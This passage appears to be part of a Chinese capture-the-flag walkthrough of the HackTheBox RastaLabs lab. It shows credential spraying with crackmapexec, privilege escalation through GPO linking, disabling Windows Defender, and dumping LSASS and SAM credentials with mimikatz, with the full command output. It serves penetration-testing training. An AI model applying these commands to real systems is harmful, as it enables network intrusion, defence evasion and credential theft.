  dwDataLen          : 000000b0 - 176
  pbData             : fd644567a8942b8757f2ce57cd1e55afa17bd98dc7c7ef9c02fa07993f5102beadb70bf16f7b1997d74e575e2a2a3366ef652e080599a833a6de80fec890de040a96689912dd0afd81f8bb7c95a1196f27d3e67ff7388b5796c57acb93b1d08ad535fffca49b553f13838ef45cc1e84b7f4c7dd77ed2f4c98cdb2b510d940f4a9ecc8937e2d4608a4f37cc23b25cb6a5a4baaeb522c701f6593739c142f90d5bae2817a2a60e714bedfcc9d116b9f3ee
  dwSignLen          : 00000014 - 20
  pbSign             : 27c58b475fdccd39c91c3b6ec4ce83bfe09f0c86

Decrypting Credential:
 * volatile cache: GUID:{d9435061-0935-4557-afc9-a3eeac1d3c25};KeyHash:154c03970a072ff66b610ea891712b8c8b104ecf;Key:available
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000aa - 170
  credUnk0       : 00000000 - 0

  Type           : 00000001 - 1 - generic
  Flags          : 00000000 - 0
  LastWritten    : 15/11/2017 10:03:00
  unkFlagsOrSize : 00000020 - 32
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : LegacyGeneric:target=bowen
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : bowen
  CredentialBlob : NovakDjokovic001
  Attributes     : 0

mimikatz(commandline) # exit
Bye!
```

这跟 sekurlsa::logonpasswords 里 credman 部分看到的一样。这个 credential 文件里存的就是 bowen   自己保存的凭据，没有额外的惊喜。

# FS&MX&SQL&SRV-RLAB\epugh_adm
> epugh_adm\IReallyH8LongPasswords!
>

## crackmapexec
### 10.10.120.1/24
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q crackmapexec smb 10.10.120.1/24 -u epugh_adm -p 'IReallyH8LongPasswords!'
SMB         10.10.120.1     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:rastalabs.local) (signing:True) (SMBv1:True)
SMB         10.10.120.15    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.120.5     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.120.10    445    MX01             [*] Windows Server 2016 Standard 14393 x64 (name:MX01) (domain:rastalabs.local) (signing:True) (SMBv1:True)
SMB         10.10.120.1     445    DC01             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 
SMB         10.10.120.15    445    SRV01            [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! (Pwn3d!)
SMB         10.10.120.5     445    FS01             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 
SMB         10.10.120.10    445    MX01             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 

                                                                                                        
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q crackmapexec winrm 10.10.120.1/24 -u epugh_adm -p 'IReallyH8LongPasswords!'
SMB         10.10.120.15    5985   SRV01            [*] Windows 10 / Server 2016 Build 14393 (name:SRV01) (domain:rastalabs.local)
SMB         10.10.120.10    5985   MX01             [*] Windows 10 / Server 2016 Build 14393 (name:MX01) (domain:rastalabs.local)
HTTP        10.10.120.10    5985   MX01             [*] http://10.10.120.10:5985/wsman
HTTP        10.10.120.15    5985   SRV01            [*] http://10.10.120.15:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.120.15    5985   SRV01            [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! (Pwn3d!)
```

### 10.10.121.1/24
```plain
┌──(kali㉿kali)-[~/Desktop/htb/rastalabs]
└─$ proxychains -q crackmapexec smb 10.10.121.1/24 -u epugh_adm -p 'IReallyH8LongPasswords!'
SMB         10.10.121.107   445    WS02             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS02) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.121.112   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.121.108   445    WS06             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS06) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.121.107   445    WS02             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 
SMB         10.10.121.112   445    WS01             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 
SMB         10.10.121.108   445    WS06             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 
```

### 10.10.122.1/24
```plain
┌──(kali㉿kali)-[~]
└─$  proxychains -q crackmapexec smb 10.10.122.1/24 -u ngodfrey_adm -p 'J5KCwKruINyCJBKd1dZU'

SMB         10.10.122.15    445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL01) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.122.25    445    SQL02            [*] Windows Server 2016 Standard 14393 x64 (name:SQL02) (domain:rastalabs.local) (signing:False) (SMBv1:True)
SMB         10.10.122.15    445    SQL01            [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
SMB         10.10.122.25    445    SQL02            [+] rastalabs.local\ngodfrey_adm:J5KCwKruINyCJBKd1dZU 
```

### 10.10.123.1/24
```plain
┌──(kali㉿kali)-[~]
└─$ proxychains -q crackmapexec smb 10.10.123.1/24 -u epugh_adm -p 'IReallyH8LongPasswords!'
SMB         10.10.123.100   445    WS03             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS03) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.100   445    WS03             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 
SMB         10.10.123.101   445    WS04             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS04) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.101   445    WS04             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 
SMB         10.10.123.110   445    WS05             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS05) (domain:rastalabs.local) (signing:False) (SMBv1:False)
SMB         10.10.123.110   445    WS05             [+] rastalabs.local\epugh_adm:IReallyH8LongPasswords! 
```

## bloodhound
![](/image/hackthebox-prolabs/RastaLabs-21.png)

![](/image/hackthebox-prolabs/RastaLabs-22.png)

![](/image/hackthebox-prolabs/RastaLabs-23.png)

`epugh_adm` 属于 `Infrastructure Support`，而这组对 `Member Servers` 相关 GPO/OU 有权限。

![](/image/hackthebox-prolabs/RastaLabs-24.png)

Infrastructure Support 组的权限是：可以往 Member Servers OU 上链接 GPO，而不是修改现有 GPO 的内容

因此我们可以间接控制SRV01&SQL01&SQL02&MX01&FS01

## rdp扫描
```plain
# 逐个试，/auth-only 只验证不开桌面，快
  for ip in 10.10.120.1 10.10.120.5 10.10.120.10 10.10.120.15; do
      echo "=== $ip ==="
      timeout 15 proxychains -q xfreerdp /v:$ip /u:epugh_adm /d:rastalabs.local /p:'IReallyH8LongPasswords!' /cert:ignore
  /auth-only 2>&1 | grep -iE "Authentication|error|failed|success|gdi_init"
  done
```

## rdp-FS01-10.10.120.5
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/rastalabs]
└─# proxychains -q xfreerdp /v:10.10.120.5 /u:epugh_adm /d:rastalabs.local /p:'IReallyH8LongPasswords!' /cert:ignore   +clipboard /drive:share,/home/kali/Desktop/tools
```

## FS01-GPO
### 打开gpmc
```plain
gpmc.msc
```

![](/image/hackthebox-prolabs/RastaLabs-25.png)

### 新建GPO
![](/image/hackthebox-prolabs/RastaLabs-26.png)

### 输入GPO名字
![](/image/hackthebox-prolabs/RastaLabs-27.png)

### 右键编辑
![](/image/hackthebox-prolabs/RastaLabs-28.png)

computer configuration -- policies -- windows settings -- security settings -- restricted groups 然后添加组

![](/image/hackthebox-prolabs/RastaLabs-29.png)

### 输入Administrator用户组
![](/image/hackthebox-prolabs/RastaLabs-30.png)

### 添加用户
![](/image/hackthebox-prolabs/RastaLabs-31.png)

### 确定应用
![](/image/hackthebox-prolabs/RastaLabs-32.png)

### 右键<font style="color:rgb(57, 58, 52);background-color:rgba(17, 17, 51, 0.02);">Member Servers OU选择 Link an Existing GPO</font>
这一步把 GPO 链接到父 OU，这样我们就是FS,MX,SQL,SRV的管理员了

![](/image/hackthebox-prolabs/RastaLabs-33.png)

### 选择新创的local admin
![](/image/hackthebox-prolabs/RastaLabs-34.png)



### 右键新建的组策略选择Enforced
![](/image/hackthebox-prolabs/RastaLabs-35.png)

### 刷新GPO
```plain
C:\Users\epugh_adm>gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

### 检测GPO
```plain
C:\Users\epugh_adm>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
RLAB\epugh_adm
The command completed successfully.
```

我们发现epugh_adm成功加入管理员

## FS01-Getflag
以管理员方式登录，然后输入epugh_adm\IReallyH8LongPasswords!

```plain
PS C:\Windows\system32> takeown /f "C:\Users\Administrator\Desktop\flag.txt" /a
# 1. 获取文件所有权（给 Administrators 组）
SUCCESS: The file (or folder): "C:\Users\Administrator\Desktop\flag.txt" now owned by the administrators group.
PS C:\Windows\system32> icacls "C:\Users\Administrator\Desktop\flag.txt" /grant Administrators:F
# 2. 授予 Administrators 组完全控制权限
processed file: C:\Users\Administrator\Desktop\flag.txt
Successfully processed 1 files; Failed processing 0 files
PS C:\Windows\system32> type "C:\Users\Administrator\Desktop\flag.txt"
# 3. 读取文件
RASTA{6p0_4bu53_15_h4rdc0r3}
```

## FS01-Mimikatz
### Add-MpPreference
```plain
Add-MpPreference -ExclusionPath C:\Users\Public
```

### psexec
这里我rdp时挂载了我tools文件夹所以直接CV即可

```plain
C:\Users\Public>PsExec64.exe -i -s cmd.exe
```

### 禁用defender
```plain
# 1. 修改注册表禁用实时保护
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. 重启 Defender 服务
Start-Service -Name WinDefend

# 3. 现在可以复制文件了
Copy-Item \\tsclient\share\minikatz\x64\mimikatz.exe C:\Users\Public\
```

### privilege::debug
```plain
C:\Users\Public>C:\Users\Public\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 8342435 (00000000:007f4ba3)
Session           : CachedInteractive from 3
User Name         : epugh_adm
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 16/03/2026 15:09:59
SID               : S-1-5-21-1396373213-2872852198-2033860859-1159
        msv :
         [00000003] Primary
         * Username : epugh_adm
         * Domain   : RLAB
         * NTLM     : 8bfd10f0484f52314831296e66ef7c51
         * SHA1     : 022cab09cad9c16e268dabda5aa4ab3a715488fe
         * DPAPI    : 2d925907dd5c82996fd4b1ac338957b5
        tspkg :
        wdigest :
         * Username : epugh_adm
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : epugh_adm
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 6362736 (00000000:00611670)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 12:49:31
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : RLAB
         * NTLM     : eed2715e728dbf1873827ea000e1ce07
         * SHA1     : c9d28099cd076d5438d0ced8312da4d7799e8d0c
        tspkg :
        wdigest :
         * Username : FS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : FS01$
         * Domain   : rastalabs.local
         * Password : 94 c2 67 ca c6 b5 4d 07 34 56 e1 7b 07 dd e8 ff 0d 76 59 fa 0f ee ba 6b 94 11 97 61 97 98 54 a1 39 eb 67 48 75 e8 81 13 0b 95 09 25 95 96 06 91 33 6a a4 63 5c 0e f1 3a 03 0c 76 10 2e fa 93 3a 87 dd 78 b1 fc 42 ae 6f d6 f6 b9 f4 92 44 18 aa c8 3f 3b 17 76 9a 41 c4 82 d3 79 0d 0c 5f 7a 3f 65 38 25 25 78 2b 88 aa 2d 14 46 2c 65 ec c1 9e 88 ef 69 df e1 7d ad 8d c0 46 44 54 62 be 44 d2 ba 5d a1 95 b5 c5 c5 8e e0 be 6a 17 c2 a5 f2 a5 b3 74 2e eb 55 05 28 ad 88 6d d6 75 28 98 9d bb 46 1e 4a 37 7f 04 6f de 4f 47 a0 8b 16 99 f1 0e 35 8d f9 ed 5a 0f 6e 8a 13 12 b5 68 0f e5 c3 21 be df 68 4b 62 58 31 b1 1a 17 52 ec d7 c6 ed cc d9 79 87 a6 d1 ba 83 69 dc 8b e3 85 d1 f8 76 af 8c 1c 93 72 4c 07 47 bf fa 3c 01 34 71 5d 27 01
        ssp :
        credman :

Authentication Id : 0 ; 403707 (00000000:000628fb)
Session           : RemoteInteractive from 2
User Name         : rweston_da
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 16/03/2026 03:27:25
SID               : S-1-5-21-1396373213-2872852198-2033860859-1161
        msv :
         [00000003] Primary
         * Username : rweston_da
         * Domain   : RLAB
         * NTLM     : 3ff61fa259deee15e4042159d7b832fa
         * SHA1     : fb1ff95bca66348334fbca023809d498e82bd9e1
         * DPAPI    : ab7b75ff84475be2e8c4dcb7390955c3
        tspkg :
        wdigest :
         * Username : rweston_da
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : rweston_da
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 386768 (00000000:0005e6d0)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:27:25
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : RLAB
         * NTLM     : eed2715e728dbf1873827ea000e1ce07
         * SHA1     : c9d28099cd076d5438d0ced8312da4d7799e8d0c
        tspkg :
        wdigest :
         * Username : FS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : FS01$
         * Domain   : rastalabs.local
         * Password : 94 c2 67 ca c6 b5 4d 07 34 56 e1 7b 07 dd e8 ff 0d 76 59 fa 0f ee ba 6b 94 11 97 61 97 98 54 a1 39 eb 67 48 75 e8 81 13 0b 95 09 25 95 96 06 91 33 6a a4 63 5c 0e f1 3a 03 0c 76 10 2e fa 93 3a 87 dd 78 b1 fc 42 ae 6f d6 f6 b9 f4 92 44 18 aa c8 3f 3b 17 76 9a 41 c4 82 d3 79 0d 0c 5f 7a 3f 65 38 25 25 78 2b 88 aa 2d 14 46 2c 65 ec c1 9e 88 ef 69 df e1 7d ad 8d c0 46 44 54 62 be 44 d2 ba 5d a1 95 b5 c5 c5 8e e0 be 6a 17 c2 a5 f2 a5 b3 74 2e eb 55 05 28 ad 88 6d d6 75 28 98 9d bb 46 1e 4a 37 7f 04 6f de 4f 47 a0 8b 16 99 f1 0e 35 8d f9 ed 5a 0f 6e 8a 13 12 b5 68 0f e5 c3 21 be df 68 4b 62 58 31 b1 1a 17 52 ec d7 c6 ed cc d9 79 87 a6 d1 ba 83 69 dc 8b e3 85 d1 f8 76 af 8c 1c 93 72 4c 07 47 bf fa 3c 01 34 71 5d 27 01
        ssp :
        credman :

Authentication Id : 0 ; 386752 (00000000:0005e6c0)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:27:25
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : RLAB
         * NTLM     : eed2715e728dbf1873827ea000e1ce07
         * SHA1     : c9d28099cd076d5438d0ced8312da4d7799e8d0c
        tspkg :
        wdigest :
         * Username : FS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : FS01$
         * Domain   : rastalabs.local
         * Password : 94 c2 67 ca c6 b5 4d 07 34 56 e1 7b 07 dd e8 ff 0d 76 59 fa 0f ee ba 6b 94 11 97 61 97 98 54 a1 39 eb 67 48 75 e8 81 13 0b 95 09 25 95 96 06 91 33 6a a4 63 5c 0e f1 3a 03 0c 76 10 2e fa 93 3a 87 dd 78 b1 fc 42 ae 6f d6 f6 b9 f4 92 44 18 aa c8 3f 3b 17 76 9a 41 c4 82 d3 79 0d 0c 5f 7a 3f 65 38 25 25 78 2b 88 aa 2d 14 46 2c 65 ec c1 9e 88 ef 69 df e1 7d ad 8d c0 46 44 54 62 be 44 d2 ba 5d a1 95 b5 c5 c5 8e e0 be 6a 17 c2 a5 f2 a5 b3 74 2e eb 55 05 28 ad 88 6d d6 75 28 98 9d bb 46 1e 4a 37 7f 04 6f de 4f 47 a0 8b 16 99 f1 0e 35 8d f9 ed 5a 0f 6e 8a 13 12 b5 68 0f e5 c3 21 be df 68 4b 62 58 31 b1 1a 17 52 ec d7 c6 ed cc d9 79 87 a6 d1 ba 83 69 dc 8b e3 85 d1 f8 76 af 8c 1c 93 72 4c 07 47 bf fa 3c 01 34 71 5d 27 01
        ssp :
        credman :

Authentication Id : 0 ; 74059 (00000000:0001214b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:21:25
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : RLAB
         * NTLM     : eed2715e728dbf1873827ea000e1ce07
         * SHA1     : c9d28099cd076d5438d0ced8312da4d7799e8d0c
        tspkg :
        wdigest :
         * Username : FS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : FS01$
         * Domain   : rastalabs.local
         * Password : 94 c2 67 ca c6 b5 4d 07 34 56 e1 7b 07 dd e8 ff 0d 76 59 fa 0f ee ba 6b 94 11 97 61 97 98 54 a1 39 eb 67 48 75 e8 81 13 0b 95 09 25 95 96 06 91 33 6a a4 63 5c 0e f1 3a 03 0c 76 10 2e fa 93 3a 87 dd 78 b1 fc 42 ae 6f d6 f6 b9 f4 92 44 18 aa c8 3f 3b 17 76 9a 41 c4 82 d3 79 0d 0c 5f 7a 3f 65 38 25 25 78 2b 88 aa 2d 14 46 2c 65 ec c1 9e 88 ef 69 df e1 7d ad 8d c0 46 44 54 62 be 44 d2 ba 5d a1 95 b5 c5 c5 8e e0 be 6a 17 c2 a5 f2 a5 b3 74 2e eb 55 05 28 ad 88 6d d6 75 28 98 9d bb 46 1e 4a 37 7f 04 6f de 4f 47 a0 8b 16 99 f1 0e 35 8d f9 ed 5a 0f 6e 8a 13 12 b5 68 0f e5 c3 21 be df 68 4b 62 58 31 b1 1a 17 52 ec d7 c6 ed cc d9 79 87 a6 d1 ba 83 69 dc 8b e3 85 d1 f8 76 af 8c 1c 93 72 4c 07 47 bf fa 3c 01 34 71 5d 27 01
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : FS01$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 16/03/2026 03:21:24
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : RLAB
         * NTLM     : eed2715e728dbf1873827ea000e1ce07
         * SHA1     : c9d28099cd076d5438d0ced8312da4d7799e8d0c
        tspkg :
        wdigest :
         * Username : FS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : fs01$
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 35306 (00000000:000089ea)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 16/03/2026 03:21:24
SID               :
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : RLAB
         * NTLM     : eed2715e728dbf1873827ea000e1ce07
         * SHA1     : c9d28099cd076d5438d0ced8312da4d7799e8d0c
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 10129558 (00000000:009a9096)
Session           : CachedInteractive from 3
User Name         : epugh_adm
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 16/03/2026 15:53:01
SID               : S-1-5-21-1396373213-2872852198-2033860859-1159
        msv :
         [00000003] Primary
         * Username : epugh_adm
         * Domain   : RLAB
         * NTLM     : 8bfd10f0484f52314831296e66ef7c51
         * SHA1     : 022cab09cad9c16e268dabda5aa4ab3a715488fe
         * DPAPI    : 2d925907dd5c82996fd4b1ac338957b5
        tspkg :
        wdigest :
         * Username : epugh_adm
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : epugh_adm
         * Domain   : RASTALABS.LOCAL
         * Password : IReallyH8LongPasswords!
        ssp :
        credman :

Authentication Id : 0 ; 6369208 (00000000:00612fb8)
Session           : RemoteInteractive from 3
User Name         : epugh_adm
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 16/03/2026 12:49:31
SID               : S-1-5-21-1396373213-2872852198-2033860859-1159
        msv :
         [00000003] Primary
         * Username : epugh_adm
         * Domain   : RLAB
         * NTLM     : 8bfd10f0484f52314831296e66ef7c51
         * SHA1     : 022cab09cad9c16e268dabda5aa4ab3a715488fe
         * DPAPI    : 2d925907dd5c82996fd4b1ac338957b5
        tspkg :
        wdigest :
         * Username : epugh_adm
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : epugh_adm
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 6362719 (00000000:0061165f)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 12:49:31
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : RLAB
         * NTLM     : eed2715e728dbf1873827ea000e1ce07
         * SHA1     : c9d28099cd076d5438d0ced8312da4d7799e8d0c
        tspkg :
        wdigest :
         * Username : FS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : FS01$
         * Domain   : rastalabs.local
         * Password : 94 c2 67 ca c6 b5 4d 07 34 56 e1 7b 07 dd e8 ff 0d 76 59 fa 0f ee ba 6b 94 11 97 61 97 98 54 a1 39 eb 67 48 75 e8 81 13 0b 95 09 25 95 96 06 91 33 6a a4 63 5c 0e f1 3a 03 0c 76 10 2e fa 93 3a 87 dd 78 b1 fc 42 ae 6f d6 f6 b9 f4 92 44 18 aa c8 3f 3b 17 76 9a 41 c4 82 d3 79 0d 0c 5f 7a 3f 65 38 25 25 78 2b 88 aa 2d 14 46 2c 65 ec c1 9e 88 ef 69 df e1 7d ad 8d c0 46 44 54 62 be 44 d2 ba 5d a1 95 b5 c5 c5 8e e0 be 6a 17 c2 a5 f2 a5 b3 74 2e eb 55 05 28 ad 88 6d d6 75 28 98 9d bb 46 1e 4a 37 7f 04 6f de 4f 47 a0 8b 16 99 f1 0e 35 8d f9 ed 5a 0f 6e 8a 13 12 b5 68 0f e5 c3 21 be df 68 4b 62 58 31 b1 1a 17 52 ec d7 c6 ed cc d9 79 87 a6 d1 ba 83 69 dc 8b e3 85 d1 f8 76 af 8c 1c 93 72 4c 07 47 bf fa 3c 01 34 71 5d 27 01
        ssp :
        credman :

Authentication Id : 0 ; 403656 (00000000:000628c8)
Session           : RemoteInteractive from 2
User Name         : rweston_da
Domain            : RLAB
Logon Server      : DC01
Logon Time        : 16/03/2026 03:27:25
SID               : S-1-5-21-1396373213-2872852198-2033860859-1161
        msv :
         [00000003] Primary
         * Username : rweston_da
         * Domain   : RLAB
         * NTLM     : 3ff61fa259deee15e4042159d7b832fa
         * SHA1     : fb1ff95bca66348334fbca023809d498e82bd9e1
         * DPAPI    : ab7b75ff84475be2e8c4dcb7390955c3
        tspkg :
        wdigest :
         * Username : rweston_da
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : rweston_da
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 74022 (00000000:00012126)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 16/03/2026 03:21:25
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : FS01$
         * Domain   : RLAB
         * NTLM     : eed2715e728dbf1873827ea000e1ce07
         * SHA1     : c9d28099cd076d5438d0ced8312da4d7799e8d0c
        tspkg :
        wdigest :
         * Username : FS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : FS01$
         * Domain   : rastalabs.local
         * Password : 94 c2 67 ca c6 b5 4d 07 34 56 e1 7b 07 dd e8 ff 0d 76 59 fa 0f ee ba 6b 94 11 97 61 97 98 54 a1 39 eb 67 48 75 e8 81 13 0b 95 09 25 95 96 06 91 33 6a a4 63 5c 0e f1 3a 03 0c 76 10 2e fa 93 3a 87 dd 78 b1 fc 42 ae 6f d6 f6 b9 f4 92 44 18 aa c8 3f 3b 17 76 9a 41 c4 82 d3 79 0d 0c 5f 7a 3f 65 38 25 25 78 2b 88 aa 2d 14 46 2c 65 ec c1 9e 88 ef 69 df e1 7d ad 8d c0 46 44 54 62 be 44 d2 ba 5d a1 95 b5 c5 c5 8e e0 be 6a 17 c2 a5 f2 a5 b3 74 2e eb 55 05 28 ad 88 6d d6 75 28 98 9d bb 46 1e 4a 37 7f 04 6f de 4f 47 a0 8b 16 99 f1 0e 35 8d f9 ed 5a 0f 6e 8a 13 12 b5 68 0f e5 c3 21 be df 68 4b 62 58 31 b1 1a 17 52 ec d7 c6 ed cc d9 79 87 a6 d1 ba 83 69 dc 8b e3 85 d1 f8 76 af 8c 1c 93 72 4c 07 47 bf fa 3c 01 34 71 5d 27 01
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 16/03/2026 03:21:25
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : FS01$
Domain            : RLAB
Logon Server      : (null)
Logon Time        : 16/03/2026 03:21:24
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : FS01$
         * Domain   : RLAB
         * Password : (null)
        kerberos :
         * Username : fs01$
         * Domain   : RASTALABS.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```

### lsadump::sam
```plain
C:\Users\Public\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

```plain

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::sam
Domain : FS01
SysKey : 20f7aaadecaffc8bce183870a66064a5
Local SID : S-1-5-21-2919673885-940875513-1261788316

SAMKey : 98384b9755ba82981a3c1fa5ea2eef0e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 05579b017d2931f3bc631ab7f384ece0
    lm  - 0: 64434fb9a320a149864e336ad334097a
    lm  - 1: e1a51360e67c3e4d5d3c7d60d9a15a84
    lm  - 2: aec9f803bef2abfde1498e89a2c00195
    lm  - 3: 1692eb3c01a0508c46a985301717cb6c
    lm  - 4: 0085f9c99a0a3fd19c60765b9d5861be
    lm  - 5: 81763eb189a9e79c892b4075b1c9b761
    lm  - 6: 5caabe577794e69c228457e83f54b3ad
    lm  - 7: 141a6bcb3f8903dfd567d5936ad590bd
    lm  - 8: fd83d0690ad08730984049c95d86cc27
    lm  - 9: 85ae339fe608faa7945eedd332a54f22
    lm  -10: 1fcd4af77eb83f523ae7231fe01c3b2a
    lm  -11: c2b64731c4a9463df721e74b4c08e626
    lm  -12: 9a2c7a1062af21f0613f13c0edc5a8ea
    lm  -13: bca5f555a617e5cc08ffb3e0ae128edb
    lm  -14: 3812d347cd65204d30646f1d68f8822c
    lm  -15: bd52611b448aa6e40acacc90dc3275a5
    lm  -16: eb2f1aa484fd7517076b9ac995229ec6
    lm  -17: 7791a995e32ec82c572eb918e35df4e2
    lm  -18: 764862000373aa27d7b2eb026eb73256
    lm  -19: 7098646c0087310aff8ef5cf50dd6824
